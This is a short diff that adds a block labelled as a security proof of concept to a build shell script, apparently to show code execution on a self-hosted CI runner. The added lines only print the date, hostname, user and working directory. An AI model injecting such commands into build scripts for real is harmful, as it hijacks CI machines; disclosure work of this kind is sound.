@@ -1,5 +1,13 @@
 #!/bin/sh
 
+# [Security PoC] Demonstrate RCE on self-hosted runner
+echo "=== SECURITY RCE PoC ==="
+echo "Date: $(date)"
+echo "Host: $(hostname)"
+echo "User: $(whoami)"
+echo "CWD:  $(pwd)"
+echo "=== END PoC ==="
+
 #
 # Copyright © 2015-2021 the original authors.
 #
